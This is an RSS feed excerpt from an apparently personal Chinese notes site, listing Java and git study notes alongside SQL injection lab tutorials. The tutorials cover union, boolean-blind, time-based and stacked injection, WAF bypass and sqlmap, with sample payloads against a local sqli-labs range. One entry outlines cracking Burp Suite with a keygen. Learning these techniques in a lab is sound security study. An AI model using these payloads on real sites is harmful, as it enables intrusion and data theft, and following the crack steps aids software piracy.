uname=admin&amp;rsquo; union select 1,2 &amp;ndash;+&amp;amp;passwd=admin&amp;amp;submit=Submit</description></item><item><title>3101_注解</title><link>https://ob.tianzhongs.ml/3101_%E6%B3%A8%E8%A7%A3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3101_%E6%B3%A8%E8%A7%A3/</guid><description>3101_注解 Created: August 10, 2022 8:13 PM
[!faq]+ 作用 对Java中类、方法、成员变量做标记，进行特殊处理
基本 注解，或者叫做注释类型，英文单词是：Annotation
注解Annotation是一种引用数据类型。编译之后也是生成xxx.class文
定义 1 2 3 [修饰符列表] @interface 注解名{ public 属性类型 属性名() default 默认值; } 总结 有且只有value属性，可以直接写属性值 设置了default默认值的属性，使用时可以不写属性值，其他属性全都需要写 属性=属性值 注解的属性可以是 byte short int long float double boolean char String Class 枚举类型 以及以上每一种的数组形式。 使用： 注解的使用格式是</description></item><item><title>3102_注解补充</title><link>https://ob.tianzhongs.ml/3102_%E6%B3%A8%E8%A7%A3%E8%A1%A5%E5%85%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3102_%E6%B3%A8%E8%A7%A3%E8%A1%A5%E5%85%85/</guid><description>3102_注解补充 ![faq]+ 解析注解的技巧 注解在哪个成分上，就拿哪个成分对象 比如注解作用于成员方法，就获取成员方法对应的method对象，再拿注解
注解解析案例 eg1 题目
代码
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package annotationTest; import org.</description></item><item><title>3201_单例设计模式【补充】</title><link>https://ob.tianzhongs.ml/3201_%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%A1%A5%E5%85%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3201_%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%A1%A5%E5%85%85/</guid><description>3201_单例设计模式【补充】 单例必须将构造器私有化
单例：只需要一个对象即可
饿汉单例模式 使用情况：
在用类获取对象的时候，对象已经提前为你创建好了（提前创建所需要的对象）
设计步骤 定义一个类，构造器私有化 定义一个静态变量存储这个new的类的对象 1 2 3 4 5 6 7 8 9 10 /** a、定义一个单例类 */ public class SingleInstance { /** c.</description></item><item><title>3202_Calendar日历类使用【补充】</title><link>https://ob.tianzhongs.ml/3202_Calendar%E6%97%A5%E5%8E%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E8%A1%A5%E5%85%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3202_Calendar%E6%97%A5%E5%8E%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E8%A1%A5%E5%85%85/</guid><description>3202_Calendar日历类使用【补充】 注意，calendar不能直接new对象，需要通过懒汉单例
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package test; import sun.</description></item><item><title>3203_Lambda表达式</title><link>https://ob.tianzhongs.ml/3203_Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3203_Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid><description>3203_Lambda表达式 只能简化函数式接口的匿名内部类的写法
必须是接口，有且只有一个抽象方法 一般这个接口上会加函数式接口的注解@FunctionalInterface 作用
简化匿名内部类的代码写法（Java8的一个新特性)
书写格式 1 2 3 (匿名内部类的被重写的形参列表)-&amp;gt;{ 被重写的方法体; }; 书写格式进一步简化 括号的形参类型可以不写 如果只有一个参数，参数类型可以省略，同时()可以省略 如果Lambda的方法体只有一行代码，可以省略大括号不写，同时需要省略分号； 如果只有一行代码，且是return语句，可以省略return不写，分号也需要省略 实例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package LambdaTest; import java.</description></item><item><title>3203_正则表达式</title><link>https://ob.tianzhongs.ml/3203_%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3203_%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid><description>3203_正则表达式 用于匹配字符规则
1 2 3 4 5 6 7 8 9 10 11 12 package d6_regex; public class RegexTest01 { public static void main(String[] args) { System.</description></item><item><title>3204_二叉树、平衡二叉树、红黑树</title><link>https://ob.tianzhongs.ml/3204_%E4%BA%8C%E5%8F%89%E6%A0%91%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91%E7%BA%A2%E9%BB%91%E6%A0%91/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3204_%E4%BA%8C%E5%8F%89%E6%A0%91%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91%E7%BA%A2%E9%BB%91%E6%A0%91/</guid><description>3204_二叉树、平衡二叉树、红黑树 二叉树，查找二叉树（可能会变成瘸子，导致一边高一边低）
平衡二叉树 左右子节点的度数不超过1,
[!faq]+ 平衡二叉树添加元素的过程中出现了不平衡怎么解决
左左：右旋 右右：左旋 左右：找到问题子树，将其左旋，然后将根树进行右旋 右左：找到问题子树，将其右旋，然后将根树进行左旋 红黑树 优点：增删改查性能都很好
规则 根节点必须是黑色，每一个节点是红色或者黑色 每一个节点没有子节点或者父节点，就将其设置为黑色的Nil（大致就是null） 红色节点的子节点必须是黑色，不能出现两个红色父子节点相连的情况 每一个节点，从该节点到所有子节点的简单路径上的黑色节点数是相同的</description></item><item><title>3205_日志技术</title><link>https://ob.tianzhongs.ml/3205_%E6%97%A5%E5%BF%97%E6%8A%80%E6%9C%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3205_%E6%97%A5%E5%BF%97%E6%8A%80%E6%9C%AF/</guid><description>3205_日志技术 常用的日志规范 日志规范一般是一些接口，常用的有
Commons Logging Simple Logging facade for Java 常用的日志框架 Log4j Logback(性能好) Logback日志框架 组成部分 由三部分组成</description></item><item><title>3206_IO流的补充</title><link>https://ob.tianzhongs.ml/3206_IO%E6%B5%81%E7%9A%84%E8%A1%A5%E5%85%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3206_IO%E6%B5%81%E7%9A%84%E8%A1%A5%E5%85%85/</guid><description>3206_IO流的补充 【案例】文件搜索 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import java.</description></item><item><title>3207_喝酒与瓶子的问题</title><link>https://ob.tianzhongs.ml/3207_%E5%96%9D%E9%85%92%E4%B8%8E%E7%93%B6%E5%AD%90%E7%9A%84%E9%97%AE%E9%A2%98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3207_%E5%96%9D%E9%85%92%E4%B8%8E%E7%93%B6%E5%AD%90%E7%9A%84%E9%97%AE%E9%A2%98/</guid><description>3207_喝酒与瓶子的问题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 /** * 目标：啤酒2元1瓶，4个盖子可以换一瓶，2个空瓶可以换一瓶， * 请问10元钱可以喝多少瓶酒，剩余多少空瓶和盖子。 * 答案：15瓶 3盖子 1瓶子 */ public class Test02 { public static int totalNumber;//喝酒总数 public static int lastBottleNumber;//最后的空瓶数量 public static int lastCoverNumber;//最后的盖子数量 public static int i=1; public static void main(String[] args) { buy(10); System.</description></item><item><title>3301_单元测试</title><link>https://ob.tianzhongs.ml/3301_%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3301_%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/</guid><description>3301_单元测试 单元测试框架：JUnit
优点： 1. 灵活选择执行哪些方法，也可以一键执行全部的方法。 2. 一键生成测试报告 3. 每个方法独立运行，不会影响其他的方法测试
JUnit的使用方法 导包，一般idea都是自带了该框架（如果没有，就进行导包或者在idea中对测试方法进行注解@Test的时候，alt+enter的弹出框中进行下载导入 ） 1 2 hamcrest-core-1.3.jar junit-4.13.1.jar `` 编写测试代码：必须是公共无参数无返回值的非静态方法 在测试方法上进行注解，标注@Test该方法是测试方法 在测试方法中完成被测试方法的正确性测试 选中测试方法，选择JUnit测试，绿色良好，红色失败 JUnit常用注解 开始执行的方法，用来初始化资源 执行完之后的方法，用来结束资源 4.</description></item><item><title>3401_动态代理</title><link>https://ob.tianzhongs.ml/3401_%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3401_%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</guid><description>3401_动态代理 #未完成</description></item><item><title>4.1_2 SQL注入之查询方式</title><link>https://ob.tianzhongs.ml/4.1_2-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/4.1_2-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/</guid><description>SQL注入之查询方式 当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显得原因可能时SQL语句查询方式问题导致，这个时候我们需要用到报错或者盲注进行后续操作，同时在注入的过程中，提前了解其中SQL语句可以更好的选择对应的注入语句。
select 查询数据
例如：在网站应用中进行数据显示查询操作
1 select * from user where id=$id delete 删除数据 例如：后台管理里面删除文章删除用户等操作
1 delete from user where id=$id insert 插入数据 例如：在网站应用中进行用户注册添加操作</description></item><item><title>4.3SQL注入之延时注入</title><link>https://ob.tianzhongs.ml/4.3SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/4.3SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/</guid><description>基于时间的SQL盲注 - 延时注入 知识储备：
sleep（）： Sleep 函数可以使计算机程序（进程，任务或线程）进入休眠
if（）： i f 是 计算机编程语言一个关键字，分支结构的一种
mid(a,b,c): 从b开始，截取a字符串的c位
substr(a,b,c)： 从b开始，截取字符串a的c长度
left(database(),1),database() : left(a,b)从左侧截取a的前b位
length(database())=8 ： 判断长度</description></item><item><title>4.4SQL注入之布尔盲注</title><link>https://ob.tianzhongs.ml/4.4SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/4.4SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</guid><description>1.什么是布尔盲注？ Web的页面的仅仅会返回True和False。那么布尔盲注就是进行SQL注入之后然后根据页面返回的True或者是False来得到数据库中的相关信息。
返回False时：
返回True时：
2.如何进行布尔盲注？ 注入流程：
3.靶场案例演示： 1.** 猜解数据库的名字**
`http://127.0.0.1/sql/Less-5/index.php?id=1&amp;rsquo; and ascii(mid(database(),1,1))&amp;gt;115&amp;ndash;+ 非正常
http://127.0.0.1/sql/Less-5/index.php?id=1&amp;rsquo; and ascii(mid(database(),1,1))&amp;gt;116&amp;ndash;+ 非正常</description></item><item><title>4.5SQL注入之加解密注入</title><link>https://ob.tianzhongs.ml/4.5SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%B3%A8%E5%85%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/4.5SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%B3%A8%E5%85%A5/</guid><description>Base64是网络上最常见的用于传输8Bit 字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示 二进制数据的方法。
Less-21关 Cookie加密注入：
通过Burpsuite抓包：
进行Base64解密：</description></item><item><title>4.6SQL注入之堆叠注入</title><link>https://ob.tianzhongs.ml/4.6SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/4.6SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</guid><description>SQL注入之堆叠注入 在SQL中，分号 ；是用来表示一条sql语句的结束，试想一下我们在 ； 结束一个sql语句后面继续构造下一个语句 会不会一起执行？因此这个想法也就造就了堆叠注入。
而union injection（联合注入）也是将两条语句合并在一起 两者之间有什么区别？区别就在于union执行语句类型有限，可以用来执行查询语句，而堆叠注入可以执行的是任意语句
Less-38
http://localhost/sqli-labs-master/Less-38/?id=1%27;insert%20into%20users(id,username,password)%20values%20(%2722%27,%27mc%27,%27hello%27)&amp;ndash;+</description></item><item><title>5.1SQL注入之WAF绕过</title><link>https://ob.tianzhongs.ml/5.1SQL%E6%B3%A8%E5%85%A5%E4%B9%8BWAF%E7%BB%95%E8%BF%87/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/5.1SQL%E6%B3%A8%E5%85%A5%E4%B9%8BWAF%E7%BB%95%E8%BF%87/</guid><description>SQL注入之WAF绕过 WAF拦截原理：WAF从规则库中匹配敏感字符进行拦截。 {:height 573, :width 734}
关键词大小写绕过 1 2 3 有的WAF因为规则设计的问题，只匹配纯大写或纯小写的字符，对字符大小写混写直接无视，这时，我们可以利用这一点来进行绕过 举例： union select ---&amp;gt; unIOn SeLEcT 编码绕过 1 2 3 针对WAF过滤的字符编码，如使用URL编码，Unicode编码，十六进制编码，Hex编码等.</description></item><item><title>6.1SQL注入之sqlmap使用-get型注入</title><link>https://ob.tianzhongs.ml/6.1SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlmap%E4%BD%BF%E7%94%A8-get%E5%9E%8B%E6%B3%A8%E5%85%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/6.1SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlmap%E4%BD%BF%E7%94%A8-get%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid><description>SQL注入之sqlmap使用(get型注入) 一、SQLMap介绍 1、Sqlmap简介： Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。
目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access等大多数据库。
2、Sqlmap支持的注入方式： Sqlmap全面支持六种SQL注入技术：
基于布尔类型的盲注：即可以根据返回页面判断条件真假的注入。 基于时间的盲注：即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。 基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。 联合查询注入：在可以使用Union的情况下的注入。 堆查询注入：可以同时执行多条语句时的注入。 带外注入：构造SQL语句，这些语句在呈现给数据库时会触发数据库系统创建与攻击者控制的外部服务器的连接。以这种方式，攻击者可以收集数据或可能控制数据库的行为。 二、SQLMap使用： 1、判断是否存在注入： 假设目标注入点是 http://127.</description></item><item><title>6.2SQL注入之sqlmap使用-post注入</title><link>https://ob.tianzhongs.ml/6.2SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlmap%E4%BD%BF%E7%94%A8-post%E6%B3%A8%E5%85%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/6.2SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlmap%E4%BD%BF%E7%94%A8-post%E6%B3%A8%E5%85%A5/</guid><description>SQL注入之sqlmap使用(post注入) POST型：与数据库交互是通过post数据进行，URL不可见
利用sqlmap进行POST注入，常见的有三种方法: 注入方式一： 1.用Burp抓包，然后保存抓取到的内容。例如：保存为1.txt,然后把它放至某个目录下
{:height 479, :width 734}
2.列数据库:
sqlmap.py -r C:\Users\ZQ\Desktop\1.txt -p uname &amp;ndash;dbs
也可以使用 * 指定需要测试的参数</description></item><item><title>&lt;% tp.file.title %></title><link>https://ob.tianzhongs.ml/%E9%80%9A%E7%94%A8%E6%A8%A1%E6%9D%BF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E9%80%9A%E7%94%A8%E6%A8%A1%E6%9D%BF/</guid><description/></item><item><title>ADB命令</title><link>https://ob.tianzhongs.ml/ADB%E5%91%BD%E4%BB%A4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/ADB%E5%91%BD%E4%BB%A4/</guid><description>ADB命令 线刷相关 1 2 3 4 5 6 7 adb version #查看adb版本 adb devices #查看连接的手机 adb sideload file.zip #刷zip包到手机 adb reboot #重启 adb reboot fastboot #重启到fastboot adb reboot bootloader #重启到bootloader界面 fast模式下</description></item><item><title>burp sulite</title><link>https://ob.tianzhongs.ml/burp-sulite/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/burp-sulite/</guid><description> 相关url： https://blog.csdn.net/qq_20737293/article/details/123031004、 安装步骤简述： 下载安装包，解压缩 准备好java环境 在解压缩的目录cmd，打开dos窗口 使用java -jar xxx.jar打开破解文件的jar包 点击run，运行，会启动bs软件 将破解jar软件中的代码复制到bs中，点击bs中的下一步，点击手动激活，不要点击最右边的按钮 然后将bs中的下一步弹出的代码放到jar软件中，破解，生成代码 最后把代码复制到bs中，破解成功 字体偏移问题 主要是因为字体缩放的原因，软件本身不适配。 将系统的缩放设置成100%，然后修改字体大小即可。 或者修改软件本身的缩放，目前没找到地方设置。</description></item><item><title>chatgpt</title><link>https://ob.tianzhongs.ml/chatgpt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/chatgpt/</guid><description> 可用的 AI_TOOL00 - 服务于人类，致力于让人类更美好。 ChatGPT 网站 - 小白工具箱 (ooopn.com) Notion AI 官网： New chat (openai.com)</description></item><item><title>csrf</title><link>https://ob.tianzhongs.ml/csrf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/csrf/</guid><description> [[01-csrf漏洞基本认识]] [[02-csrf漏洞案例]] [[03-csrf漏洞检测以及防御]]</description></item><item><title>day24_武器作业问题总结</title><link>https://ob.tianzhongs.ml/day24_%E6%AD%A6%E5%99%A8%E4%BD%9C%E4%B8%9A%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/day24_%E6%AD%A6%E5%99%A8%E4%BD%9C%E4%B8%9A%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</guid><description> 没有基本的结构 没有想到异常处理 容易忘记在方法上写 throws 异常 在throw new的时候放在了for里面，这非常纸张。导致的情况是，添加了一个武器就添加不进去了，还找了半天的问题</description></item><item><title>Git</title><link>https://ob.tianzhongs.ml/Git/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/Git/</guid><description>常用命令大全 学习set [[git-远程仓库一般流程]] [[git-安装之后的配置]] [[git-查看配置信息]] [[git-更新内容一般流程]] [[git-查看历史版本]] [[git-代码合并的不同方式]] [[git-克隆仓库]] 基本使用 [[Git的基本使用]] 其他 [[将.</description></item><item><title>git-代码合并的不同方式</title><link>https://ob.tianzhongs.ml/git-%E4%BB%A3%E7%A0%81%E5%90%88%E5%B9%B6%E7%9A%84%E4%B8%8D%E5%90%8C%E6%96%B9%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/git-%E4%BB%A3%E7%A0%81%E5%90%88%E5%B9%B6%E7%9A%84%E4%B8%8D%E5%90%8C%E6%96%B9%E5%BC%8F/</guid><description>005-代码合并的不同方式 强制推送 git push --force origin master
删除主机分支 git push origin --delete master
下载远程仓库与本地合并 git pull 命令用于从远程获取代码并合并本地的版本。
1 git pull &amp;lt;远程主机名&amp;gt; &amp;lt;远程分支名&amp;gt;:&amp;lt;本地分支名&amp;gt; eg:git pull origin master</description></item><item><title>git-克隆仓库</title><link>https://ob.tianzhongs.ml/git-%E5%85%8B%E9%9A%86%E4%BB%93%E5%BA%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/git-%E5%85%8B%E9%9A%86%E4%BB%93%E5%BA%93/</guid><description>006-克隆仓库 强制推送 git push --force origin master
删除主机分支 git push origin --delete master
下载远程仓库与本地合并 git pull 命令用于从远程获取代码并合并本地的版本。
1 git pull &amp;lt;远程主机名&amp;gt; &amp;lt;远程分支名&amp;gt;:&amp;lt;本地分支名&amp;gt; eg:git pull origin master</description></item><item><title>git-安装之后的配置</title><link>https://ob.tianzhongs.ml/git-%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/git-%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/</guid><description>001-安装之后的配置 初始化 1 git init 设置个人名称和邮箱 ^veaiyshu 1 2 $ git config --global user.name &amp;#34;runoob&amp;#34; $ git config --global user.</description></item><item><title>git-更新内容一般流程</title><link>https://ob.tianzhongs.ml/git-%E6%9B%B4%E6%96%B0%E5%86%85%E5%AE%B9%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/git-%E6%9B%B4%E6%96%B0%E5%86%85%E5%AE%B9%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/</guid><description>003-更新内容一般流程 comments: false date created: 2022-09-25 date modified: 2022-09-25 id: layout: page tags: Git学习笔记 title: &amp;ldquo;003.更新内容一般流程&amp;rdquo; 003.更新内容一般流程 1 2 3 git add .</description></item><item><title>git-查看历史版本</title><link>https://ob.tianzhongs.ml/git-%E6%9F%A5%E7%9C%8B%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/git-%E6%9F%A5%E7%9C%8B%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/</guid><description>004-查看历史版本 git log &amp;ndash;oneline 查看过去提交的
回退 git reset &amp;ndash;hard 版本号 git reset &amp;ndash;soft 版本号 （软回退）
git reflog 查看操作历史，用来查看自己是否成功回退</description></item><item><title>git-查看配置信息</title><link>https://ob.tianzhongs.ml/git-%E6%9F%A5%E7%9C%8B%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/git-%E6%9F%A5%E7%9C%8B%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF/</guid><description>002-查看配置信息 1 git config --list 文件放置在~/.gitconfig 或 /etc/gitconfig 使用命令vim ~/.gitconfig可以查看和进行编辑 查看单个环境变量可以采用 git config user.name就可以只查看name变量 ![[../assets/18d178a2ff494226a27b7e3aeaa151bb.png]]</description></item><item><title>git-远程仓库一般流程</title><link>https://ob.tianzhongs.ml/git-%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/git-%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/</guid><description>000-远程仓库一般流程 配置好用户凭据以及 [[git-安装之后的配置#设置个人名称和邮箱 veaiyshu|用户邮箱]]
复制仓库链接![[../assets/3cf0ea5585924e54b9d7bb48da739c58.png]]
1 2 3 4 5 6 7 cho &amp;#34;# hanguang&amp;#34; &amp;gt;&amp;gt; README.</description></item><item><title>Github Action同步某个文件夹到另一个分支</title><link>https://ob.tianzhongs.ml/Github-Action%E5%90%8C%E6%AD%A5%E6%9F%90%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%88%86%E6%94%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/Github-Action%E5%90%8C%E6%AD%A5%E6%9F%90%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%88%86%E6%94%AF/</guid><description>作用 Github Action 是 github 官方的一种工作流，可以理解为一种自动化脚本，常用于 githubPage 的部署，可以用来在 git 仓库 push 时自动完成一些动作。
使用 创建工作流 yml 文件，action 文件的创建，可以参考官方文档 GitHubActions文档 - GitHub Docs</description></item><item><title>Github：配置令牌Token</title><link>https://ob.tianzhongs.ml/Github%E9%85%8D%E7%BD%AE%E4%BB%A4%E7%89%8CToken/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/Github%E9%85%8D%E7%BD%AE%E4%BB%A4%E7%89%8CToken/</guid><description>Github：配置令牌Token Created time: January 11, 2023 4:06 AM Status: Yes Tags: https://www.notion.so/Github_Token-fcf6ab8387414ceb842e76e704921f2a, https://www.notion.so/posts-864feac8235f4311baf1750669ec1c7f d : 2023-01-11
创建 Token 打开账户设置 打开 https://github.</description></item><item><title>git子模块 submodule</title><link>https://ob.tianzhongs.ml/git%E5%AD%90%E6%A8%A1%E5%9D%97-submodule/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/git%E5%AD%90%E6%A8%A1%E5%9D%97-submodule/</guid><description>about： rouroux 添加子模块 1 2 3 git submodule add gitUrl 模块名称 git submodule update --init #初始化 git submodule update --remote #更新到最新版本子模块 更新子模块 1 2 git submodule update --init //初始化版本 git submodule update --remote //更新到最新版本 删除子模块 1 2 3 4 rm -rf 子模块目录 #删除子模块目录及源码 bash下使用 vi .</description></item><item><title>Git的基本使用</title><link>https://ob.tianzhongs.ml/Git%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/Git%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</guid><description>Git的基本使用 设置代理 1 git config --global http.proxy http://127.0.0.1:7890 提交三部曲 1 2 3 git add . git commit -m &amp;#34;提交内容&amp;#34; git push #提交到远程仓库中 git配置方面 1 2 3 4 5 6 7 git config --global http.</description></item><item><title>IO流</title><link>https://ob.tianzhongs.ml/IO%E6%B5%81/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/IO%E6%B5%81/</guid><description>IO流 IO流 Created: August 1, 2022 8:50 AM 类别: IO
包：java.io
书写注意点 创建流对象的时候异常： 写入对象会有IOException需要捕获，因为你输出输出数据了 读取对象会有FileNotFoundException 需要捕获，因为你读取文件路径要找文件 流关闭的时候会有IOException，同理，你要找文件把它关闭了 先创建的流对象要赋值null，放在try外面，try里面在对文件路径进行赋值，避免在finally关闭的时候找不到变量 output操作一定要记得flush Stream结尾的是字节流，什么文件都可以操作；但是writer和reader结尾的是字符流，专用对普通文本操作，可以 直接进行String的写出 流的分类 流的方向：输入流、输出流 读取数据的方式：字节流、字符流 IO四大家族 java.</description></item><item><title>Java</title><link>https://ob.tianzhongs.ml/Java/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/Java/</guid><description>本来挺喜欢Java的，但是就业形式严峻，跑路了。
Java基础
